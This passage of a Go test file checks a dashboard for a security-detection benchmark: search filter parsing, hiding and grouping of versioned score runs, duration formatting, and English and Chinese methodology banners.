		"Denominator transparency.", "sim-missing-bin", "sim-builtin",
		"NOT-RUN on a bare reference bench", "account_creation",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("/classes missing %q", want)
		}
	}
	_, body = getBody(t, s, "/classes?lang=zh")
	if !strings.Contains(body, "分母透明") || !strings.Contains(body, "执行模式") {
		t.Error("zh classes must render the Chinese denominator banner")
	}
}

// parseCaseFilter is the boundary: it lowercases/trims the search and rejects
// a non-positive page back to 1.
func TestParseCaseFilter(t *testing.T) {
	f := parseCaseFilter(url.Values{"q": {"  NMAP  "}, "page": {"0"}, "tactic": {"TA0007"}})
	if f.Query != "nmap" || f.Page != 1 || f.Tactic != "TA0007" {
		t.Errorf("parseCaseFilter = %+v, want query nmap/page 1/tactic TA0007", f)
	}
	f = parseCaseFilter(url.Values{"page": {"3"}})
	if f.Page != 3 {
		t.Errorf("page = %d, want 3", f.Page)
	}
}

// buildScoresView hides deprecated runs by default, counts them as archived,
// buckets the visible runs by version (unversioned last), and reveals the
// archived runs under the toggle. Empty input is exact zeros, never a hollow pass.
func TestBuildScoresView(t *testing.T) {
	runs := []Run{
		{RunID: "a", Version: "2026.11"},
		{RunID: "b", Version: "2026.10", Deprecated: true},
		{RunID: "c", Version: "2026.11"},
		{RunID: "d"},
	}
	v := buildScoresView(runs, false)
	if v.Total != 4 || v.Archived != 1 {
		t.Fatalf("total/archived = %d/%d, want 4/1", v.Total, v.Archived)
	}
	if len(v.Runs) != 3 {
		t.Fatalf("visible runs = %d, want 3 (deprecated hidden)", len(v.Runs))
	}
	for _, r := range v.Runs {
		if r.Deprecated {
			t.Error("deprecated run must be hidden by default")
		}
	}
	if len(v.Groups) != 2 || v.Groups[0].Version != "2026.11" || len(v.Groups[0].Runs) != 2 {
		t.Fatalf("groups = %+v, want 2026.11 (2 runs) then unversioned", v.Groups)
	}
	if v.Groups[1].Version != "" || len(v.Groups[1].Runs) != 1 {
		t.Errorf("last group = %+v, want unversioned (1 run)", v.Groups[1])
	}
	s := buildScoresView(runs, true)
	if len(s.Runs) != 4 || s.Archived != 1 {
		t.Fatalf("show-deprecated visible/archived = %d/%d, want 4/1", len(s.Runs), s.Archived)
	}
	if len(s.Groups) != 3 || s.Groups[0].Version != "2026.10" {
		t.Errorf("show-deprecated groups = %+v, want 2026.10 first", s.Groups)
	}
	e := buildScoresView(nil, false)
	if e.Total != 0 || e.Archived != 0 || len(e.Runs) != 0 || len(e.Groups) != 0 {
		t.Errorf("empty view = %+v, want zeros", e)
	}
}

// parseShowDeprecated is the boundary: only 1/true reveal archived runs.
func TestParseShowDeprecated(t *testing.T) {
	if parseShowDeprecated(url.Values{}) {
		t.Error("default must hide deprecated")
	}
	if !parseShowDeprecated(url.Values{"show_deprecated": {"1"}}) {
		t.Error("show_deprecated=1 must reveal")
	}
	if !parseShowDeprecated(url.Values{"show_deprecated": {"true"}}) {
		t.Error("show_deprecated=true must reveal")
	}
	if parseShowDeprecated(url.Values{"show_deprecated": {"0"}}) {
		t.Error("show_deprecated=0 must hide")
	}
}

func TestFmtDuration(t *testing.T) {
	if got := fmtDuration(nil); got != "–" {
		t.Errorf("fmtDuration(nil) = %q, want dash", got)
	}
	i := int64(500)
	if got := fmtDuration(&i); got != "500 ms" {
		t.Errorf("fmtDuration(500) = %q, want 500 ms", got)
	}
	j := int64(123456)
	if got := fmtDuration(&j); got != "123.5 s" {
		t.Errorf("fmtDuration(123456) = %q, want 123.5 s", got)
	}
}

// The cross-version incomparability banner is framework-ready: it renders with
// zero runs and pins the benchmark versions plus the input sha triple.
func TestScoresCrossVersionBanner(t *testing.T) {
	d := &Data{Meta: Meta{Version: "2026.11", AttackVersion: "20.1", Calibre: "v2.2"}, Runs: []Run{}}
	out := renderPage(t, "scores.html", d)
	for _, want := range []string{
		"Runs are comparable only within the same version and environment.",
		"Versions are pinned", "exec-log-sha256", "docs/03 D9", "2026.11", "20.1",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("cross-version banner missing %q", want)
		}
	}
}

// The five P3 methodology panels render with zero runs (framework-ready).
func TestScoresP3MethodologyPanels(t *testing.T) {
	out := renderPage(t, "scores.html", &Data{Meta: Meta{Calibre: "v2.2"}, Runs: []Run{}})
	for _, want := range []string{
		"Reproducibility and the input triple", "exec-log-sha256", "alerts-sha256", "docs/03 D9",
		"Version governance and archiving", "archived, not deleted",
		"Label source", "Tech-tag column counts native labels only",
		"Run modifiers", "Configuration Change", "Delayed",
		"Cost and latency", "not true MTTD",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("P3 methodology missing %q", want)
		}
	}
}

// With zero runs the archive toggle, evidence links and version groups stay
// absent: the framework never invents a run.
func TestScoresEmptyNoArchiveOrEvidence(t *testing.T) {
	out := renderPage(t, "scores.html", &Data{Meta: Meta{Calibre: "v2.2"}, Runs: []Run{}})
	for _, absent := range []string{"Show archived runs", "Raw evidence", "archived-badge", "version-head"} {
		if strings.Contains(out, absent) {
			t.Errorf("empty scores must not render %q", absent)
		}
	}
}

// A run with the P3 slots filled renders the evidence links, version group,
// modifier tags, label-source counts and duration.
func TestScoresSyntheticEvidenceAndSlots(t *testing.T) {
	r := demoRun(true)
	r.Version = "2026.11"
	r.ArtifactReport = "artifacts/demo-001/report.md"
	r.ArtifactExecLog = "artifacts/demo-001/exec.log"
	r.ArtifactAlerts = "artifacts/demo-001/alerts.json"
	r.Modifiers = []string{"Configuration Change", "Delayed"}
	r.LabelSourceCounts = map[string]int{"native": 3, "adapter": 1, "reviewer": 0}
	dur := int64(2500)
	r.DurationMs = &dur
	out := renderPage(t, "scores.html", &Data{Runs: []Run{r}})
	for _, want := range []string{
		"Raw evidence", "artifacts/demo-001/report.md", "artifacts/demo-001/exec.log",
		"artifacts/demo-001/alerts.json", "Version 2026.11", "Configuration Change",
		"Delayed", "native=3", "adapter=1", "2.5 s",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("synthetic P3 run card missing %q", want)
		}
	}
}

// A run without artifacts or duration/label-source renders no evidence region
// and discloses "not recorded" rather than a hollow zero.
func TestScoresNoArtifactsNoEvidence(t *testing.T) {
	out := renderPage(t, "scores.html", &Data{Runs: []Run{demoRun(true)}})
	if strings.Contains(out, "Raw evidence") {
		t.Error("run without artifacts must not render the evidence region")
	}
	if !strings.Contains(out, "not recorded") {
		t.Error("run without duration/label source must disclose not recorded")
	}
}

// Through the real mux: a deprecated run is hidden by default with an archive
// banner and toggle; ?show_deprecated=1 reveals it with the archived badge.
func TestScoresDeprecatedHiddenByDefault(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	active := demoRun(true)
	active.Product = "SYNTHETIC-ACTIVE"
	arch := demoRun(true)
	arch.Product = "SYNTHETIC-ARCHIVED"
	arch.Deprecated = true
	d.Runs = []Run{active, arch}
	s := testServer(t, d)
	_, body := getBody(t, s, "/scores")
	if strings.Contains(body, "SYNTHETIC-ARCHIVED") {
		t.Error("deprecated run must be hidden by default")
	}
	if !strings.Contains(body, "SYNTHETIC-ACTIVE") {
		t.Error("active run must render")
	}
	for _, want := range []string{"Show archived runs", "retired run archived."} {
		if !strings.Contains(body, want) {
			t.Errorf("archive banner missing %q", want)
		}
	}
	_, shown := getBody(t, s, "/scores?show_deprecated=1")
	if !strings.Contains(shown, "SYNTHETIC-ARCHIVED") {
		t.Error("show_deprecated=1 must reveal the archived run")
	}
	if !strings.Contains(shown, "archived-badge") {
		t.Error("revealed archived run must carry the archived badge")
	}
	if !strings.Contains(shown, "Hide archived runs") {
		t.Error("show_deprecated view must offer Hide archived runs")
	}
}

// Version groups render in ascending version order, independent of input order.
func TestScoresVersionGrouping(t *testing.T) {
	r1 := demoRun(true)
	r1.Version = "2026.11"
	r2 := demoRun(true)
	r2.Version = "2026.10"
	out := renderPage(t, "scores.html", &Data{Runs: []Run{r1, r2}})
	iNew := strings.Index(out, "Version 2026.11")
	iOld := strings.Index(out, "Version 2026.10")
	if iNew < 0 || iOld < 0 {
		t.Fatalf("version headings missing: new=%d old=%d", iNew, iOld)
	}
	if iOld > iNew {
		t.Error("version groups must sort ascending (2026.10 before 2026.11)")
	}
}

// The P3 banner and methodology render in Chinese through the real mux.
func TestScoresP3Chinese(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	s := testServer(t, d)
	_, zh := getBody(t, s, "/scores?lang=zh")
	for _, want := range []string{
		"仅同版本同环境", "复现与输入三元组", "版本治理与归档", "标注来源", "跑案修饰符", "成本与延迟",
	} {
		if !strings.Contains(zh, want) {
			t.Errorf("zh scores missing %q", want)
		}
	}
}